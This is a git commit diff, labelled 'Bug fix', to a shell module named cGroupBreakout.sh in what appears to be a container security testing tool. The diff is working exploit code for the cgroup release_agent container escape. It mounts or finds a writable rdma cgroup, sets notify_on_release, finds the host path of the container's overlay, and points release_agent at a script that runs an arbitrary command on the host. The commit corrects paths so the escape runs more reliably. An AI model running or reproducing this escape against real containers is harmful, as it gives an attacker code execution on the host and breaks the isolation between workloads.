d27ea7e32bd7eab74e4482a2ffd596b7ccda254a
yanivyakobovich <63718435+yanivyakobovich@users.noreply.github.com>
2022-02-01 11:18:24 +0200

    Bug fix

--- data/modules/sourcecode/sh/cGroupBreakout/cGroupBreakout.sh
+++ data/modules/sourcecode/sh/cGroupBreakout/cGroupBreakout.sh
@@ -8,18 +8,18 @@ exploitCGroupBreakout() {
   # shellcheck disable=SC2012 # Not using find as it may not be available
   if cat /proc/self/mountinfo | grep -q '^[^[:space:]]*[[:space:]][^[:space:]]*[[:space:]][^[:space:]]*[[:space:]][^[:space:]]*[[:space:]]/sys/fs/cgroup/rdma[[:space:]]rw[[:space:],]'; then
     # then, cgroup is mounted as read-write
-    d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
+    d=`dirname $(ls -x /s*/fs/c*/r*/r* |head -n1)`
     mkdir -p $d/x
   else
     # else, cgroup is not mounted as read-write, try to mount rdma controller and gain access to write to the cgroup
     d=/tmp/cgrp
-    mkdir -p $d && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir $d/x
+    mkdir -p $d && mount -t cgroup -o rdma cgroup $d && mkdir $d/x
   fi
 
   echo 1 > $d/x/notify_on_release
   host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
   touch /output
-  echo "$host_path/cmd_to_execute" > /tmp/cgrp/release_agent
+  echo "$host_path/cmd_to_execute" > $d/release_agent
   echo '#!/bin/sh' > /cmd_to_execute
   echo "$cmd > $host_path/output" >> /cmd_to_execute
   chmod +x /cmd_to_execute
